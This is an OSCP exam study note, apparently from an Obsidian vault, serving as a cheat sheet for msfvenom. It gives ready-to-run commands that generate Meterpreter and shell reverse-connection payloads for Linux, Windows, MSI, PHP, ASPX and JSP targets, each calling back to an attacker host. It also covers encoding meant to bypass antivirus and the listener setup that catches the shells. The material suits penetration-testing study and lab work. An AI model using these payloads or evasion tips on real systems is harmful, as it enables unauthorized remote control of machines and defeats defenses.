---
tags: [oscp, tools, msfvenom, payloads]
aliases: [Metasploit Payloads]
category: Tools
difficulty: ★★☆☆☆
last-updated: 2025-04-30
---

# 💣 MSFvenom Payload Generation

> [!info] The Payload Factory
> Generate shells, stagers, and encoders instantly.

---

## 📋 Basic Syntax

```bash
msfvenom -p PAYLOAD -f FORMAT -o OUTPUT [LHOST=IP LPORT=PORT]
```

---

## 🐧 Linux Payloads

### x86 ELF Reverse Shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
./shell.elf
```

### x64 ELF Reverse Shell

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

### Bash Payload

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f raw
```

---

## 🪟 Windows Payloads

### x86 EXE Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

### x64 EXE Reverse Shell

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

### PowerShell Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f psh-cmd
```

### MSI Installer (AlwaysInstallElevated)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi
```

---

## 🌐 Web Payloads

### PHP Reverse Shell

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php
```

### ASP.NET Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx -o shell.aspx
```

### JSP Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.jsp
```

---

## 🛠️ Encoding & Obfuscation

### Encode Payload (Bypass Antivirus)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell_encoded.exe
```

### Multiple Iterations

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
# -i 5: encode 5 times
```

---

## 📊 Format Options

| Format | Use |
|--------|-----|
| `exe` | Windows executable |
| `elf` | Linux executable |
| `asm` | Assembly code |
| `c` | C code |
| `python` | Python script |
| `php` | PHP webshell |
| `asp`/`aspx` | ASP.NET |
| `jsp` | Java |
| `psh-cmd` | PowerShell |
| `raw` | Raw shellcode |

---

## 🎯 Handler Setup

### Start Listener

```bash
# Multi-handler (works with all payloads)
msfconsole
> use exploit/multi/handler
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST 0.0.0.0
> set LPORT 4444
> run

# Or one-liner
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

---

## 💡 Pro Tips

> [!tip] Always Encode
> Add `-e x86/shikata_ga_nai` to bypass basic AV

> [!tip] Architecture Matters
> x86 vs x64 - check target architecture first!

> [!tip] Test Locally First
> Always test payload locally in VM before using in exam

---

**Related Notes:**
- [[02-Linux/Shells-and-Payloads|💀 Shells & Payloads]]
- [[01-Methodology/Pentest-Methodology|🗺️ Pentest Methodology]]

---
